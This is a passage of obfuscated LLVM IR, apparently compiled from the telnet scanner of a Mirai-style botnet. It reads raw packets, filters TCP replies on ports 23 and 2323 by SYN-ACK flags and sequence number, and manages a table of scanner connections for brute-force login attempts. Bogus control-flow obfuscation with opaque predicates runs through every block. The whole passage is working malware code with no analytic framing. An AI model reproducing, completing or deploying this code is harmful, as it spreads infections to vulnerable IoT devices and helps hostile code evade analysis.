; <label>:371:                                    ; preds = %672, %612, %600, %576, %568, %originalBBpart274, %originalBBpart270, %511, %originalBBpart266, %471, %448, %370
  %372 = load i32, i32* @x.63
  %373 = load i32, i32* @y.64
  %374 = sub i32 %372, 1
  %375 = mul i32 %372, %374
  %376 = urem i32 %375, 2
  %377 = icmp eq i32 %376, 0
  %378 = icmp slt i32 %373, 10
  %379 = or i1 %377, %378
  br i1 %379, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %371
  %380 = getelementptr inbounds [1514 x i8], [1514 x i8]* %27, i32 0, i32 0
  %381 = bitcast i8* %380 to %struct.iphdr*
  store %struct.iphdr* %381, %struct.iphdr** %28, align 8
  %382 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i64 1
  %384 = bitcast %struct.iphdr* %383 to %struct.tcphdr*
  store %struct.tcphdr* %384, %struct.tcphdr** %29, align 8
  %385 = call i32* @__errno_location() #7
  store i32 0, i32* %385, align 4
  %386 = load i32, i32* @rsck, align 4
  %387 = getelementptr inbounds [1514 x i8], [1514 x i8]* %27, i32 0, i32 0
  %388 = bitcast %union.__CONST_SOCKADDR_ARG* %31 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %388, align 8
  %389 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %31, i32 0, i32 0
  %390 = load %struct.sockaddr*, %struct.sockaddr** %389, align 8
  %391 = call i64 @recvfrom(i32 %386, i8* %387, i64 1514, i32 16384, %struct.sockaddr* %390, i32* null)
  %392 = trunc i64 %391 to i32
  store i32 %392, i32* %26, align 4
  %393 = load i32, i32* %26, align 4
  %394 = icmp sle i32 %393, 0
  %395 = load i32, i32* @x.63
  %396 = load i32, i32* @y.64
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br i1 %394, label %411, label %403

; <label>:403:                                    ; preds = %originalBBpart250
  %404 = call i32* @__errno_location() #7
  %405 = load i32, i32* %404, align 4
  %406 = icmp eq i32 %405, 11
  br i1 %406, label %411, label %407

; <label>:407:                                    ; preds = %403
  %408 = call i32* @__errno_location() #7
  %409 = load i32, i32* %408, align 4
  %410 = icmp eq i32 %409, 11
  br i1 %410, label %411, label %428

; <label>:411:                                    ; preds = %407, %403, %originalBBpart250
  %412 = load i32, i32* @x.63
  %413 = load i32, i32* @y.64
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %411
  %420 = load i32, i32* @x.63
  %421 = load i32, i32* @y.64
  %422 = sub i32 %420, 1
  %423 = mul i32 %420, %422
  %424 = urem i32 %423, 2
  %425 = icmp eq i32 %424, 0
  %426 = icmp slt i32 %421, 10
  %427 = or i1 %425, %426
  br i1 %427, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %684

; <label>:428:                                    ; preds = %407
  %429 = load i32, i32* @x.63
  %430 = load i32, i32* @y.64
  %431 = sub i32 %429, 1
  %432 = mul i32 %429, %431
  %433 = urem i32 %432, 2
  %434 = icmp eq i32 %433, 0
  %435 = icmp slt i32 %430, 10
  %436 = or i1 %434, %435
  br i1 %436, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %428
  %437 = load i32, i32* %26, align 4
  %438 = sext i32 %437 to i64
  %439 = icmp ult i64 %438, 40
  %440 = load i32, i32* @x.63
  %441 = load i32, i32* @y.64
  %442 = sub i32 %440, 1
  %443 = mul i32 %440, %442
  %444 = urem i32 %443, 2
  %445 = icmp eq i32 %444, 0
  %446 = icmp slt i32 %441, 10
  %447 = or i1 %445, %446
  br i1 %447, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br i1 %439, label %448, label %449

; <label>:448:                                    ; preds = %originalBBpart258
  br label %371

; <label>:449:                                    ; preds = %originalBBpart258
  %450 = load i32, i32* @x.63
  %451 = load i32, i32* @y.64
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %449
  %458 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %459 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %458, i32 0, i32 9
  %460 = load i32, i32* %459, align 4
  %461 = load i32, i32* @LOCAL_ADDR, align 4
  %462 = icmp ne i32 %460, %461
  %463 = load i32, i32* @x.63
  %464 = load i32, i32* @y.64
  %465 = sub i32 %463, 1
  %466 = mul i32 %463, %465
  %467 = urem i32 %466, 2
  %468 = icmp eq i32 %467, 0
  %469 = icmp slt i32 %464, 10
  %470 = or i1 %468, %469
  br i1 %470, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br i1 %462, label %471, label %472

; <label>:471:                                    ; preds = %originalBBpart262
  br label %371

; <label>:472:                                    ; preds = %originalBBpart262
  %473 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %474 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %473, i32 0, i32 6
  %475 = load i8, i8* %474, align 1
  %476 = zext i8 %475 to i32
  %477 = icmp ne i32 %476, 6
  br i1 %477, label %478, label %495

; <label>:478:                                    ; preds = %472
  %479 = load i32, i32* @x.63
  %480 = load i32, i32* @y.64
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %478
  %487 = load i32, i32* @x.63
  %488 = load i32, i32* @y.64
  %489 = sub i32 %487, 1
  %490 = mul i32 %487, %489
  %491 = urem i32 %490, 2
  %492 = icmp eq i32 %491, 0
  %493 = icmp slt i32 %488, 10
  %494 = or i1 %492, %493
  br i1 %494, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %371

; <label>:495:                                    ; preds = %472
  %496 = load %struct.tcphdr*, %struct.tcphdr** %29, align 8
  %497 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %496, i32 0, i32 0
  %498 = load i16, i16* %497, align 4
  %499 = zext i16 %498 to i32
  %500 = call zeroext i16 @htons(i16 zeroext 23) #7
  %501 = zext i16 %500 to i32
  %502 = icmp ne i32 %499, %501
  br i1 %502, label %503, label %512

; <label>:503:                                    ; preds = %495
  %504 = load %struct.tcphdr*, %struct.tcphdr** %29, align 8
  %505 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %504, i32 0, i32 0
  %506 = load i16, i16* %505, align 4
  %507 = zext i16 %506 to i32
  %508 = call zeroext i16 @htons(i16 zeroext 2323) #7
  %509 = zext i16 %508 to i32
  %510 = icmp ne i32 %507, %509
  br i1 %510, label %511, label %512

; <label>:511:                                    ; preds = %503
  br label %371

; <label>:512:                                    ; preds = %503, %495
  %513 = load %struct.tcphdr*, %struct.tcphdr** %29, align 8
  %514 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %513, i32 0, i32 1
  %515 = load i16, i16* %514, align 2
  %516 = zext i16 %515 to i32
  %517 = load i16, i16* %10, align 2
  %518 = zext i16 %517 to i32
  %519 = icmp ne i32 %516, %518
  br i1 %519, label %520, label %537

; <label>:520:                                    ; preds = %512
  %521 = load i32, i32* @x.63
  %522 = load i32, i32* @y.64
  %523 = sub i32 %521, 1
  %524 = mul i32 %521, %523
  %525 = urem i32 %524, 2
  %526 = icmp eq i32 %525, 0
  %527 = icmp slt i32 %522, 10
  %528 = or i1 %526, %527
  br i1 %528, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %520
  %529 = load i32, i32* @x.63
  %530 = load i32, i32* @y.64
  %531 = sub i32 %529, 1
  %532 = mul i32 %529, %531
  %533 = urem i32 %532, 2
  %534 = icmp eq i32 %533, 0
  %535 = icmp slt i32 %530, 10
  %536 = or i1 %534, %535
  br i1 %536, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %371

; <label>:537:                                    ; preds = %512
  %538 = load %struct.tcphdr*, %struct.tcphdr** %29, align 8
  %539 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %538, i32 0, i32 4
  %540 = load i16, i16* %539, align 4
  %541 = lshr i16 %540, 9
  %542 = and i16 %541, 1
  %543 = icmp ne i16 %542, 0
  br i1 %543, label %561, label %544

; <label>:544:                                    ; preds = %537
  %545 = load i32, i32* @x.63
  %546 = load i32, i32* @y.64
  %547 = sub i32 %545, 1
  %548 = mul i32 %545, %547
  %549 = urem i32 %548, 2
  %550 = icmp eq i32 %549, 0
  %551 = icmp slt i32 %546, 10
  %552 = or i1 %550, %551
  br i1 %552, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %544
  %553 = load i32, i32* @x.63
  %554 = load i32, i32* @y.64
  %555 = sub i32 %553, 1
  %556 = mul i32 %553, %555
  %557 = urem i32 %556, 2
  %558 = icmp eq i32 %557, 0
  %559 = icmp slt i32 %554, 10
  %560 = or i1 %558, %559
  br i1 %560, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %371

; <label>:561:                                    ; preds = %537
  %562 = load %struct.tcphdr*, %struct.tcphdr** %29, align 8
  %563 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %562, i32 0, i32 4
  %564 = load i16, i16* %563, align 4
  %565 = lshr i16 %564, 12
  %566 = and i16 %565, 1
  %567 = icmp ne i16 %566, 0
  br i1 %567, label %569, label %568

; <label>:568:                                    ; preds = %561
  br label %371

; <label>:569:                                    ; preds = %561
  %570 = load %struct.tcphdr*, %struct.tcphdr** %29, align 8
  %571 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %570, i32 0, i32 4
  %572 = load i16, i16* %571, align 4
  %573 = lshr i16 %572, 10
  %574 = and i16 %573, 1
  %575 = icmp ne i16 %574, 0
  br i1 %575, label %576, label %577

; <label>:576:                                    ; preds = %569
  br label %371

; <label>:577:                                    ; preds = %569
  %578 = load i32, i32* @x.63
  %579 = load i32, i32* @y.64
  %580 = sub i32 %578, 1
  %581 = mul i32 %578, %580
  %582 = urem i32 %581, 2
  %583 = icmp eq i32 %582, 0
  %584 = icmp slt i32 %579, 10
  %585 = or i1 %583, %584
  br i1 %585, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %577
  %586 = load %struct.tcphdr*, %struct.tcphdr** %29, align 8
  %587 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %586, i32 0, i32 4
  %588 = load i16, i16* %587, align 4
  %589 = lshr i16 %588, 8
  %590 = and i16 %589, 1
  %591 = icmp ne i16 %590, 0
  %592 = load i32, i32* @x.63
  %593 = load i32, i32* @y.64
  %594 = sub i32 %592, 1
  %595 = mul i32 %592, %594
  %596 = urem i32 %595, 2
  %597 = icmp eq i32 %596, 0
  %598 = icmp slt i32 %593, 10
  %599 = or i1 %597, %598
  br i1 %599, label %originalBBpart289, label %originalBB76alteredBB

originalBBpart289:                                ; preds = %originalBB76
  br i1 %591, label %600, label %601

; <label>:600:                                    ; preds = %originalBBpart289
  br label %371

; <label>:601:                                    ; preds = %originalBBpart289
  %602 = load %struct.tcphdr*, %struct.tcphdr** %29, align 8
  %603 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %602, i32 0, i32 3
  %604 = load i32, i32* %603, align 4
  %605 = call i32 @ntohl(i32 %604) #7
  %606 = sub i32 %605, 1
  %607 = call i32 @htonl(i32 %606) #7
  %608 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %609 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %608, i32 0, i32 8
  %610 = load i32, i32* %609, align 4
  %611 = icmp ne i32 %607, %610
  br i1 %611, label %612, label %613

; <label>:612:                                    ; preds = %601
  br label %371

; <label>:613:                                    ; preds = %601
  store %struct.scanner_connection* null, %struct.scanner_connection** %30, align 8
  %614 = load i32, i32* %17, align 4
  store i32 %614, i32* %26, align 4
  br label %615

; <label>:615:                                    ; preds = %633, %613
  %616 = load i32, i32* %26, align 4
  %617 = icmp slt i32 %616, 256
  br i1 %617, label %618, label %636

; <label>:618:                                    ; preds = %615
  %619 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %620 = load i32, i32* %26, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %619, i64 %621
  %623 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %622, i32 0, i32 3
  %624 = load i32, i32* %623, align 8
  %625 = icmp eq i32 %624, 0
  br i1 %625, label %626, label %632

; <label>:626:                                    ; preds = %618
  %627 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %628 = load i32, i32* %26, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %627, i64 %629
  store %struct.scanner_connection* %630, %struct.scanner_connection** %30, align 8
  %631 = load i32, i32* %26, align 4
  store i32 %631, i32* %17, align 4
  br label %636

; <label>:632:                                    ; preds = %618
  br label %633

; <label>:633:                                    ; preds = %632
  %634 = load i32, i32* %26, align 4
  %635 = add nsw i32 %634, 1
  store i32 %635, i32* %26, align 4
  br label %615

; <label>:636:                                    ; preds = %626, %615
  %637 = load i32, i32* @x.63
  %638 = load i32, i32* @y.64
  %639 = sub i32 %637, 1
  %640 = mul i32 %637, %639
  %641 = urem i32 %640, 2
  %642 = icmp eq i32 %641, 0
  %643 = icmp slt i32 %638, 10
  %644 = or i1 %642, %643
  br i1 %644, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %636
  %645 = load %struct.scanner_connection*, %struct.scanner_connection** %30, align 8
  %646 = icmp eq %struct.scanner_connection* %645, null
  %647 = load i32, i32* @x.63
  %648 = load i32, i32* @y.64
  %649 = sub i32 %647, 1
  %650 = mul i32 %647, %649
  %651 = urem i32 %650, 2
  %652 = icmp eq i32 %651, 0
  %653 = icmp slt i32 %648, 10
  %654 = or i1 %652, %653
  br i1 %654, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br i1 %646, label %655, label %672

; <label>:655:                                    ; preds = %originalBBpart293
  %656 = load i32, i32* @x.63
  %657 = load i32, i32* @y.64
  %658 = sub i32 %656, 1
  %659 = mul i32 %656, %658
  %660 = urem i32 %659, 2
  %661 = icmp eq i32 %660, 0
  %662 = icmp slt i32 %657, 10
  %663 = or i1 %661, %662
  br i1 %663, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %655
  %664 = load i32, i32* @x.63
  %665 = load i32, i32* @y.64
  %666 = sub i32 %664, 1
  %667 = mul i32 %664, %666
  %668 = urem i32 %667, 2
  %669 = icmp eq i32 %668, 0
  %670 = icmp slt i32 %665, 10
  %671 = or i1 %669, %670
  br i1 %671, label %originalBBpart297, label %originalBB95alteredBB

originalBBpart297:                                ; preds = %originalBB95
  br label %684

; <label>:672:                                    ; preds = %originalBBpart293
  %673 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %674 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %673, i32 0, i32 8
  %675 = load i32, i32* %674, align 4
  %676 = load %struct.scanner_connection*, %struct.scanner_connection** %30, align 8
  %677 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %676, i32 0, i32 4
  store i32 %675, i32* %677, align 4
  %678 = load %struct.tcphdr*, %struct.tcphdr** %29, align 8
  %679 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %678, i32 0, i32 0
  %680 = load i16, i16* %679, align 4
  %681 = load %struct.scanner_connection*, %struct.scanner_connection** %30, align 8
  %682 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %681, i32 0, i32 5
  store i16 %680, i16* %682, align 8
  %683 = load %struct.scanner_connection*, %struct.scanner_connection** %30, align 8
  call void @setup_connection(%struct.scanner_connection* %683)
  br label %371

; <label>:684:                                    ; preds = %originalBBpart297, %originalBBpart254
  br label %685

; <label>:685:                                    ; preds = %684
  %686 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %13, i32 0, i32 0
  %687 = getelementptr inbounds [16 x i64], [16 x i64]* %686, i64 0, i64 0
  %688 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %687) #6, !srcloc !1
  %689 = extractvalue { i64, i64* } %688, 0
  %690 = extractvalue { i64, i64* } %688, 1
  %691 = trunc i64 %689 to i32
  store i32 %691, i32* %32, align 4
  %692 = ptrtoint i64* %690 to i64
  %693 = trunc i64 %692 to i32
  store i32 %693, i32* %33, align 4
  br label %694

; <label>:694:                                    ; preds = %685
  br label %695

; <label>:695:                                    ; preds = %694
  %696 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %14, i32 0, i32 0
  %697 = getelementptr inbounds [16 x i64], [16 x i64]* %696, i64 0, i64 0
  %698 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %697) #6, !srcloc !2
  %699 = extractvalue { i64, i64* } %698, 0
  %700 = extractvalue { i64, i64* } %698, 1
  %701 = trunc i64 %699 to i32
  store i32 %701, i32* %34, align 4
  %702 = ptrtoint i64* %700 to i64
  %703 = trunc i64 %702 to i32
  store i32 %703, i32* %35, align 4
  br label %704

; <label>:704:                                    ; preds = %695
  store i32 0, i32* %9, align 4
  br label %705

; <label>:705:                                    ; preds = %970, %704
  %706 = load i32, i32* %9, align 4
  %707 = icmp slt i32 %706, 256
  br i1 %707, label %708, label %973

; <label>:708:                                    ; preds = %705
  %709 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %710 = load i32, i32* %9, align 4
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %709, i64 %711
  store %struct.scanner_connection* %712, %struct.scanner_connection** %15, align 8
  %713 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %714 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %713, i32 0, i32 3
  %715 = load i32, i32* %714, align 8
  %716 = icmp ugt i32 %715, 1
  %717 = select i1 %716, i32 30, i32 5
  store i32 %717, i32* %36, align 4
  %718 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %719 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %718, i32 0, i32 3
  %720 = load i32, i32* %719, align 8
  %721 = icmp ne i32 %720, 0
  br i1 %721, label %722, label %810

; <label>:722:                                    ; preds = %708
  %723 = load i32, i32* @fake_time, align 4
  %724 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %725 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %724, i32 0, i32 2
  %726 = load i32, i32* %725, align 4
  %727 = sub i32 %723, %726
  %728 = load i32, i32* %36, align 4
  %729 = icmp ugt i32 %727, %728
  br i1 %729, label %730, label %810

; <label>:730:                                    ; preds = %722
  %731 = load i32, i32* @x.63
  %732 = load i32, i32* @y.64
  %733 = sub i32 %731, 1
  %734 = mul i32 %731, %733
  %735 = urem i32 %734, 2
  %736 = icmp eq i32 %735, 0
  %737 = icmp slt i32 %732, 10
  %738 = or i1 %736, %737
  br i1 %738, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %730
  %739 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %740 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %739, i32 0, i32 1
  %741 = load i32, i32* %740, align 8
  %742 = call i32 @close(i32 %741)
  %743 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %744 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %743, i32 0, i32 1
  store i32 -1, i32* %744, align 8
  %745 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %746 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %745, i32 0, i32 3
  %747 = load i32, i32* %746, align 8
  %748 = icmp ugt i32 %747, 2
  %749 = load i32, i32* @x.63
  %750 = load i32, i32* @y.64
  %751 = sub i32 %749, 1
  %752 = mul i32 %749, %751
  %753 = urem i32 %752, 2
  %754 = icmp eq i32 %753, 0
  %755 = icmp slt i32 %750, 10
  %756 = or i1 %754, %755
  br i1 %756, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br i1 %748, label %757, label %788

; <label>:757:                                    ; preds = %originalBBpart2101
  %758 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %759 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %758, i32 0, i32 8
  %760 = load i8, i8* %759, align 8
  %761 = add i8 %760, 1
  store i8 %761, i8* %759, align 8
  %762 = zext i8 %761 to i32
  %763 = icmp eq i32 %762, 10
  br i1 %763, label %764, label %785

; <label>:764:                                    ; preds = %757
  %765 = load i32, i32* @x.63
  %766 = load i32, i32* @y.64
  %767 = sub i32 %765, 1
  %768 = mul i32 %765, %767
  %769 = urem i32 %768, 2
  %770 = icmp eq i32 %769, 0
  %771 = icmp slt i32 %766, 10
  %772 = or i1 %770, %771
  br i1 %772, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %764
  %773 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %774 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %773, i32 0, i32 8
  store i8 0, i8* %774, align 8
  %775 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %776 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %775, i32 0, i32 3
  store i32 0, i32* %776, align 8
  %777 = load i32, i32* @x.63
  %778 = load i32, i32* @y.64
  %779 = sub i32 %777, 1
  %780 = mul i32 %777, %779
  %781 = urem i32 %780, 2
  %782 = icmp eq i32 %781, 0
  %783 = icmp slt i32 %778, 10
  %784 = or i1 %782, %783
  br i1 %784, label %originalBBpart2105, label %originalBB103alteredBB

originalBBpart2105:                               ; preds = %originalBB103
  br label %787

; <label>:785:                                    ; preds = %757
  %786 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  call void @setup_connection(%struct.scanner_connection* %786)
  br label %787

; <label>:787:                                    ; preds = %785, %originalBBpart2105
  br label %809

; <label>:788:                                    ; preds = %originalBBpart2101
  %789 = load i32, i32* @x.63
  %790 = load i32, i32* @y.64
  %791 = sub i32 %789, 1
  %792 = mul i32 %789, %791
  %793 = urem i32 %792, 2
  %794 = icmp eq i32 %793, 0
  %795 = icmp slt i32 %790, 10
  %796 = or i1 %794, %795
  br i1 %796, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %788
  %797 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %798 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %797, i32 0, i32 8
  store i8 0, i8* %798, align 8
  %799 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %800 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %799, i32 0, i32 3
  store i32 0, i32* %800, align 8
  %801 = load i32, i32* @x.63
  %802 = load i32, i32* @y.64
  %803 = sub i32 %801, 1
  %804 = mul i32 %801, %803
  %805 = urem i32 %804, 2
  %806 = icmp eq i32 %805, 0
  %807 = icmp slt i32 %802, 10
  %808 = or i1 %806, %807
  br i1 %808, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br label %809

; <label>:809:                                    ; preds = %originalBBpart2109, %787
  br label %970

; <label>:810:                                    ; preds = %722, %708
  %811 = load i32, i32* @x.63
  %812 = load i32, i32* @y.64
  %813 = sub i32 %811, 1
  %814 = mul i32 %811, %813
  %815 = urem i32 %814, 2
  %816 = icmp eq i32 %815, 0
  %817 = icmp slt i32 %812, 10
  %818 = or i1 %816, %817
  br i1 %818, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %810
  %819 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %820 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %819, i32 0, i32 3
  %821 = load i32, i32* %820, align 8
  %822 = icmp eq i32 %821, 1
  %823 = load i32, i32* @x.63
  %824 = load i32, i32* @y.64
  %825 = sub i32 %823, 1
  %826 = mul i32 %823, %825
  %827 = urem i32 %826, 2
  %828 = icmp eq i32 %827, 0
  %829 = icmp slt i32 %824, 10
  %830 = or i1 %828, %829
  br i1 %830, label %originalBBpart2113, label %originalBB111alteredBB

originalBBpart2113:                               ; preds = %originalBB111
  br i1 %822, label %831, label %889

; <label>:831:                                    ; preds = %originalBBpart2113
  %832 = load i32, i32* @x.63
  %833 = load i32, i32* @y.64
  %834 = sub i32 %832, 1
  %835 = mul i32 %832, %834
  %836 = urem i32 %835, 2
  %837 = icmp eq i32 %836, 0
  %838 = icmp slt i32 %833, 10
  %839 = or i1 %837, %838
  br i1 %839, label %originalBB115, label %originalBB115alteredBB

originalBB115:                                    ; preds = %originalBB115alteredBB, %831
  %840 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %841 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %840, i32 0, i32 1
  %842 = load i32, i32* %841, align 8
  %843 = srem i32 %842, 64
  %844 = zext i32 %843 to i64
  %845 = shl i64 1, %844
  %846 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %14, i32 0, i32 0
  %847 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %848 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %847, i32 0, i32 1
  %849 = load i32, i32* %848, align 8
  %850 = sdiv i32 %849, 64
  %851 = sext i32 %850 to i64
  %852 = getelementptr inbounds [16 x i64], [16 x i64]* %846, i64 0, i64 %851
  %853 = load i64, i64* %852, align 8
  %854 = or i64 %853, %845
  store i64 %854, i64* %852, align 8
  %855 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %856 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %855, i32 0, i32 1
  %857 = load i32, i32* %856, align 8
  %858 = load i32, i32* %20, align 4
  %859 = icmp sgt i32 %857, %858
  %860 = load i32, i32* @x.63
  %861 = load i32, i32* @y.64
  %862 = sub i32 %860, 1
  %863 = mul i32 %860, %862
  %864 = urem i32 %863, 2
  %865 = icmp eq i32 %864, 0
  %866 = icmp slt i32 %861, 10
  %867 = or i1 %865, %866
  br i1 %867, label %originalBBpart2145, label %originalBB115alteredBB

originalBBpart2145:                               ; preds = %originalBB115
  br i1 %859, label %868, label %872

; <label>:868:                                    ; preds = %originalBBpart2145
  %869 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %870 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %869, i32 0, i32 1
  %871 = load i32, i32* %870, align 8
  store i32 %871, i32* %20, align 4
  br label %872

; <label>:872:                                    ; preds = %868, %originalBBpart2145
  %873 = load i32, i32* @x.63
  %874 = load i32, i32* @y.64
  %875 = sub i32 %873, 1
  %876 = mul i32 %873, %875
  %877 = urem i32 %876, 2
  %878 = icmp eq i32 %877, 0
  %879 = icmp slt i32 %874, 10
  %880 = or i1 %878, %879
  br i1 %880, label %originalBB147, label %originalBB147alteredBB

originalBB147:                                    ; preds = %originalBB147alteredBB, %872
  %881 = load i32, i32* @x.63
  %882 = load i32, i32* @y.64
  %883 = sub i32 %881, 1
  %884 = mul i32 %881, %883
  %885 = urem i32 %884, 2
  %886 = icmp eq i32 %885, 0
  %887 = icmp slt i32 %882, 10
  %888 = or i1 %886, %887
  br i1 %888, label %originalBBpart2149, label %originalBB147alteredBB

originalBBpart2149:                               ; preds = %originalBB147
  br label %969

; <label>:889:                                    ; preds = %originalBBpart2113
  %890 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %891 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %890, i32 0, i32 3
  %892 = load i32, i32* %891, align 8
  %893 = icmp ne i32 %892, 0
  br i1 %893, label %894, label %968

; <label>:894:                                    ; preds = %889
  %895 = load i32, i32* @x.63
  %896 = load i32, i32* @y.64
  %897 = sub i32 %895, 1
  %898 = mul i32 %895, %897
  %899 = urem i32 %898, 2
  %900 = icmp eq i32 %899, 0
  %901 = icmp slt i32 %896, 10
  %902 = or i1 %900, %901
  br i1 %902, label %originalBB151, label %originalBB151alteredBB

originalBB151:                                    ; preds = %originalBB151alteredBB, %894
  %903 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
